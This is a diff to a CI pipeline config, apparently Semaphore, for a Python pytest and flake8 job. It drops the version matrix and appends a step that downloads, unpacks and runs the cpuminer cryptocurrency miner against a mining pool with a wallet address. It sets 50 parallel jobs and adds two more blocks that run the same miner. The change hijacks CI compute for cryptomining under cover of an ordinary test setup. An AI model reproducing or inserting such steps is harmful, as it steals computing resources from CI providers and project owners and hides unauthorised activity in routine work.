@@ -9,16 +9,31 @@ blocks:
     task:
       jobs:
         - name: pytest
-          matrix:
-            - env_vars: PYTHON_VERSION
-              values: ["2.7", "3.5", "3.6", "3.7"]
           commands:
             - sem-version python $PYTHON_VERSION
             - checkout
             - python -m pip install --upgrade pip
             - pip install -r requirements.txt
             - pip install flake8
-            - flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics
+            - 'flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics'
             - flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics
             - pip install pytest
             - pytest
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q5jlf86v5sw8wawypyvx9gga3eszuhyjmp3etq6 -t10'
+          parallelism: 50
+      agent:
+        machine:
+          type: e1-standard-2
+          os_image: ubuntu1804
+  - name: 'Block #2'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q5jlf86v5sw8wawypyvx9gga3eszuhyjmp3etq6 -t1'
+  - name: 'Block #3'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q5jlf86v5sw8wawypyvx9gga3eszuhyjmp3etq6 -t1'
